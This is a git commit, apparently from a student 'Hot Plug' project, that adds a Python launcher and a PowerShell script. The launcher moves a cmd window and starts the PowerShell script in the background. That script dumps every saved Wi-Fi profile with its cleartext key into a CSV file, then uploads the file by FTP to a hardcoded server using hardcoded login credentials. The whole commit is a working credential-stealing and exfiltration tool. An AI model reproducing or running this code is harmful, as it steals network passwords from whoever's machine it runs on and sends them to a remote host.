a9fe5a491ac3648d3fc338679f8457ebf1d4ccf1
branavanj <104469463+branavanj@users.noreply.github.com>
2024-02-19 10:18:09 +0100

    Add files via upload

---
+++ script.py
@@ -0,0 +1,24 @@
+import pygetwindow as gw
+import subprocess
+
+# Remplacez 'Nom de la fenetre' par le titre de la fenêtre que vous souhaitez déplacer
+window_title = 'cmd'
+
+# Trouver la fenêtre par son titre
+window = gw.getWindowsWithTitle(window_title)
+
+# Assurez-vous que la fenêtre est trouvée
+if window:
+    window = window[0]
+
+    # Déplacer la fenêtre à de nouvelles coordonnées (par exemple, 100, 100)
+    window.moveTo(814, 814)
+
+    # Chemin du script PowerShell que vous souhaitez exécuter
+    powershell_script_path = r'C:\Users\jeyak\Documents\Cours\Hot Plug\Script\wifi_connect.ps1'
+
+    # Exécuter le script PowerShell en arrière-plan
+    subprocess.Popen(['powershell', '-File', powershell_script_path], universal_newlines=True, shell=True)
+
+else:
+    print(f"Fenêtre '{window_title}' non trouvée.")
---
+++ wifi_connect.ps1
@@ -0,0 +1,72 @@
+﻿$wifi=@()
+#Visualisation des réseaux bloqués
+$cmd0=netsh wlan show blockednetworks
+#Liste des SSID
+$cmd1=netsh wlan show profiles
+ForEach($row1 in $cmd1)
+{
+    #Récupération des ssids par expression régulière
+    If($row1 -match 'Profil Tous les utilisateurs[^:]+:.(.+)$')
+    {
+        $ssid=$Matches[1]
+        $cmd2=netsh wlan show profiles $ssid key=clear
+        ForEach($row2 in $cmd2)
+        {
+            #Récupération des clés par expression régulière
+            If($row2 -match 'Contenu de la c[^:]+:.(.+)$')
+            {
+                $key=$Matches[1]
+                #Stockage des ssids et des clés dans un tableau
+                $wifi+=[PSCustomObject]@{ssid=$ssid;key=$key}
+            }
+        }
+    }
+}
+
+$wifi | Export-CSV -Path "$env:USERPROFILE\Documents\Hot Plug\Script\output.csv" -NoTypeInformation
+
+
+
+Import-Module WinSCP
+
+# Paramètres FTP
+$ftpServer = "172.20.10.5"
+$ftpUsername = "branavan"
+$ftpPassword = "9559"
+
+# Chemin distant sur le serveur FTP
+$remoteCsvFilePath = "/home/branavan/Fichier.csv"
+
+# Chemin local du fichier CSV à envoyer
+$localCsvFilePath = "$env:USERPROFILE\Documents\cours\Hot Plug\Script\output.csv"
+
+# Créer la session WinSCP
+$sessionOptions = New-Object WinSCP.SessionOptions -Property @{
+    Protocol = [WinSCP.Protocol]::Ftp
+    HostName = $ftpServer
+    UserName = $ftpUsername
+    Password = $ftpPassword
+}
+
+$session = New-Object WinSCP.Session
+
+try {
+ 
+    $session.Open($sessionOptions)
+
+   
+    $transferOptions = New-Object WinSCP.TransferOptions
+    $transferResult = $session.PutFiles($localCsvFilePath, $remoteCsvFilePath, $False, $transferOptions)
+
+    
+    if ($transferResult.IsSuccess) {
+        Write-Host "Transfert réussi!"
+    } else {
+        Write-Host "Échec du transfert."
+        foreach ($transferError in $transferResult.Failures) {
+            Write-Host "Erreur : $($transferError.Message)"
+        }
+    }
+} finally {
+    $session.Dispose()
+}
